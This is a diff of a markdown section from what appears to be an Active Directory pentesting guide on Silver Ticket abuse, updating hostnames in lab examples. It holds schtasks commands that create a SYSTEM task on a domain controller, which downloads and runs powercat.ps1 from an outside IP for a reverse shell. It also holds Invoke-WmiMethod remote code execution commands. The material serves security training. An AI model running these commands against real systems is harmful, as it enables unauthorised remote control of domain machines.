@@ -24,25 +24,22 @@ The Silver ticket needs to be created with the NT Hash of the target machine
 
 ```bash
 # Check you have permissions 
-schtasks /S some.vuln.pc
+schtasks /S dcorp-dc.dollarcorp.moneycorp.local
 
 #Create scheduled task, first for exe execution, second for powershell reverse shell download
-schtasks /create /S dcorp-dc /SC Weekly /RU "NT Authority\SYSTEM" /TN "Job" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.83/powercat.ps1''')'"
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Job" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.83/powercat.ps1''')'"
 
 #Run created schtask now
-schtasks /Run /S dcorp-dc.moneycorp.local /TN "Job"
+schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "Job"
 ```
 
 ### HOST + RPCSS
 
 With these tickets you can **execute WMI in the victim system**:
 
-```bash
-#Check you have enough privileges
-Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
-#Execute code
-Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"
-
-#You can also use wmic
-wmic remote.computer.local list full /format:list
-```
+<pre class="language-bash"><code class="lang-bash">#Check you have permissions 
+<strong>Invoke-WmiMethod -class win32_operatingsystem -ComputerName dcorp-dc
+</strong>
+# Execute code
+Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$Program"
+</code></pre>
